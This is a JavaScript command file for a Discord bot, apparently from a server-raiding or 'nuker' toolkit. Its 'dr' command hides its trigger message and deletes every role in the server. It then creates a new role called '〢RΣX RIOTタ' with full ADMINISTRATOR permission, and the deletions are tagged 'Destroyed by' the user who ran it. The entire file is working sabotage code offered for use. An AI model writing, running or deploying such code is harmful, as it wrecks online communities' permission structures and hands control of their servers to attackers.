module.exports = {
  name: 'dr',
  owner: true,
  dsc: true,
  description: 'Delete All Roles',
  run: async(client, msg, args) => {
    const roles = msg.guild.roles.cache.map(role => role.name);

    msg.delete();
    msg.channel.send(`Find **${roles.length}** roles!`).then(msg => {
      setTimeout(() => {
        msg.edit(`**Delete all roles active!**`).then(msg => {
          setTimeout(() => {
            msg.delete();
          }, 3000)
        });
          
        msg.guild.roles.cache.forEach(role => {
          role.delete({
            reason: `Destroyed by: ${msg.author.tag}`
          }).then(() => console.log(`\x1b[32mLog | ${role.name} Roles delete!\x1b[0m`)).catch(() => console.error(`\x1b[31mError | ${role.name} Failed to delete!\x1b[0m`));
        });
        msg.guild.roles.create({
          name: '〢RΣX RIOTタ',
          color: '060101',
          permissions: ['ADMINISTRATOR'],
          reason: `Destroyed by: ${msg.author.tag}`
        })
      }, 2000);
    });
  }
}